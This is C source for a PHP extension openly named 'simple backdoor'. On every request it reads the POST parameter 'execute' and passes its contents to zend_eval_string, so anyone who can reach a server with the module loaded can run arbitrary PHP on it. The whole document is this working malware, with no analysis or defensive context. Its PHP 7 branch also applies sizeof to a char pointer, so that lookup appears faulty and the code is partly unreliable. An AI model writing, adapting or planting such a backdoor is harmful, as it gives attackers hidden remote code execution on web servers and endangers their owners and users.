#include "php.h"

PHP_RINIT_FUNCTION(backdoor);
zend_module_entry backdoor_module_entry = {
    STANDARD_MODULE_HEADER,
    "simple backdoor",
    NULL,
    NULL,
    NULL,
    PHP_RINIT(backdoor),
	NULL, 
	NULL,
    "1.0",
    STANDARD_MODULE_PROPERTIES
};
ZEND_GET_MODULE(backdoor);

PHP_RINIT_FUNCTION(backdoor)
{
    char* method = "_POST";
    char* secret_string = "execute";

    #if PHP_MAJOR_VERSION < 7
        zval** arr;
        char* code;
        if (zend_hash_find(&EG(symbol_table), method, strlen(method) + 1, (void**)&arr) == SUCCESS) {
            HashTable* ht = Z_ARRVAL_P(*arr);
            zval** val;
            if (zend_hash_find(ht, secret_string, strlen(secret_string) + 1, (void**)&val) == SUCCESS) {
                code =  Z_STRVAL_PP(val);
                zend_eval_string(code, NULL, (char *)"" TSRMLS_CC);
            }
        }
    #else
        zval* arr,*code = NULL;
        if (arr = zend_hash_str_find(&EG(symbol_table), method, sizeof(method) - 1)) {
            if (Z_TYPE_P(arr) == IS_ARRAY && (code = zend_hash_str_find(Z_ARRVAL_P(arr), secret_string, strlen(secret_string)))) {
                zend_eval_string(Z_STRVAL_P(code), NULL, (char *)"" TSRMLS_CC);
            }
        }
    #endif
    return SUCCESS;
}